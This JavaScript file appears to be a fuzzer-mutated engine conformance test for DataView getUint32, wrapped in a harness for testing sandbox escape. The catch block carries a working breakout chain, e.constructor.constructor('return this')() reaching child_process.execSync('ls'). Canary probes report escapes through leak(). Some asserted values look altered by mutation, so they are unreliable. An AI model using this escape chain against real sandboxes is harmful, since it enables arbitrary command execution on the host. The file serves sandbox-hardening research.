try {
    var buffer = new ArrayBuffer(8);
    var sample = new DataView(buffer, 0);
    sample.setUint8(0, 127);
    sample.setUint8(1, 255);
    sample.setUint8(2, 255);
    sample.setUint8(3, 255);
    sample.setUint8(4, 128);
    sample.setUint8(5, 255);
    sample.setUint8(6, 128);
    var obj1 = {
        valueOf: function () {
            let REPLACER = 23;
            return 2;
        }
    };
    var obj2 = {
        toString: function () {
            throw () => {
                return () => {
                };
            };
            return 3;
        }
    };
    assert.sameValue(sample.getUint32(-0), 2147483647, '-0');
    assert.sameValue(sample.getUint32(obj1), 4294934783, 'object\'s valueOf');
    assert.sameValue(sample.getUint32(obj2), 4286644096, 'object\'s toString');
    assert.sameValue(sample.getUint32(''), 2147483647, 'the Empty string');
    assert.sameValue(sample.getUint32('0'), 2147483647, 'string \'0\'');
    assert.sameValue(sample.getUint32('2'), 4294934783, 'string \'2\'');
    assert.sameValue(sample.getUint32(true), 4294967168, 'true');
    assert.sameValue(sample.getUint32(false), 2147483647, 'false');
    assert.sameValue(sample.getUint32(NaN), 2147483647, 'NaN');
    assert.sameValue(sample.getUint32(null), 2147483647, 'null');
    assert.sameValue(sample.getUint32(0.1), 2147483647, '0.1');
    assert.sameValue(sample.getUint32(0.9), 2147483647, '0.9');
    assert.sameValue(sample.getUint32(1.1), 4294967168, '1.1');
    assert.sameValue(sample.getUint32(1.9), 4294967168, '1.9');
    assert.sameValue(sample.getUint32(-0.1), 2147483647, '-0.1');
    assert.sameValue(sample.getUint32(-0.99999), 2147483647, '-0.99999');
    assert.sameValue(sample.getUint32(undefined), 2147483647, 'undefined');
    assert.sameValue(sample.getUint32(), 2147483647, 'no arg');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}